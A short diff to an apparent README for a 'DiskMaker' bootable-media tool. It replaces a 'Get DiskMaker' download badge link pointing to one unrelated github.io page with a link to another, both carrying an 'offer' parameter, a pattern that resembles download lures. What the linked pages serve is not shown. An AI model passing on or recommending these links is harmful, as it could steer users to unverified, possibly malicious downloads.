@@ -1,6 +1,6 @@
 # DiskMaker Download — Desktop Bootable Media Creator
 
-[![Get DiskMaker GitHub](https://img.shields.io/badge/Get%20DiskMaker%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deployer.github.io/.github/?offer=DiskMaker)
+[![Get DiskMaker GitHub](https://img.shields.io/badge/Get%20DiskMaker%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://load-desk-hub.github.io/.github/?offer=DiskMaker)
 
 ---
 
